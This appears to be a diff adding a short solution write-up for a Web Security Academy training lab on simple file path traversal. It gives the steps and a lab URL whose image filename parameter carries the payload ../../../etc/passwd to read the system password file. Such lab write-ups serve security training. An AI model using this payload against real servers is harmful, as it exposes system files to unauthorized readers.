@@ -1,0 +1,28 @@
+// Lab: File path traversal, simple case.
+
+
+This lab contains a path traversal vulnerability in the display of product images.
+
+To solve the lab, retrieve the contents of the /etc/passwd file.
+
+
+
+
+// Solution
+
+
+1. Go to the product details there we can see the product with product Id.
+
+2. Copy the image Link and open in new Tab.
+
+3. modify the filename with:
+
+../../../etc/passwd
+
+
+4. The URL looks like this:
+
+https://0aec00a904479acb8101c05500e000e3.web-security-academy.net/image?filename=../../../etc/passwd
+
+
+5. This will solve the Lab.
